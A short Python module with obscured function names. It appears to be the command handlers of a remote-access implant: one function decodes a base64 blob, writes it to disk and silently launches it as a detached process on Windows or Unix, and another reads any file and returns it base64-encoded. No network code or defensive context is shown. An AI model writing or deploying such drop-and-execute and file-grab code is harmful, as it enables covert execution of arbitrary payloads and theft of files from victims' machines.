import base64
import os
import platform
import subprocess
import sys


def _f0():
    yield ([sys.executable], "current")
    if platform.system() == "Windows":
        yield (["py", "-3"], "py -3")
        yield (["python"], "python")
        yield (["python3"], "python3")
    else:
        yield (["python3"], "python3")
        yield (["python"], "python")


def _f1(path: str, cb: str, run: bool) -> tuple[bool, str]:
    try:
        raw = base64.b64decode(cb, validate=True)
    except Exception as e:
        return False, f"decode error: {e}"
    try:
        dp = os.path.dirname(path)
        if dp:
            os.makedirs(dp, exist_ok=True)
        with open(path, "wb") as f:
            f.write(raw)
    except Exception as e:
        return False, str(e)
    if not run:
        return True, f"wrote {path}"
    try:
        if platform.system() == "Windows":
            if path.lower().endswith(".py"):
                fl = subprocess.CREATE_NEW_PROCESS_GROUP if hasattr(subprocess, "CREATE_NEW_PROCESS_GROUP") else 0
                for argv, _ in _f0():
                    try:
                        subprocess.Popen(
                            argv + [path],
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL,
                            creationflags=fl,
                        )
                        return True, f"launched {path}"
                    except (FileNotFoundError, OSError):
                        continue
                return True, f"wrote {path} but run failed: no python found"
            else:
                os.startfile(path)
            return True, f"launched {path}"
        else:
            os.chmod(path, 0o700)
            if path.endswith(".py"):
                for argv, _ in _f0():
                    try:
                        subprocess.Popen(
                            argv + [path],
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL,
                            start_new_session=True,
                        )
                        return True, f"executed {path}"
                    except (FileNotFoundError, OSError):
                        continue
                return True, f"wrote {path} but run failed: no python found"
            else:
                subprocess.Popen(
                    [path],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    start_new_session=True,
                )
            return True, f"executed {path}"
    except Exception as e:
        return True, f"wrote {path} but run failed: {e}"


def _f2(path: str, mx: int = 10 * 1024 * 1024) -> tuple[bool, str]:
    try:
        with open(path, "rb") as f:
            d = f.read(mx + 1)
        if len(d) > mx:
            return False, "file too large"
        return True, base64.b64encode(d).decode("ascii")
    except Exception as e:
        return False, str(e)
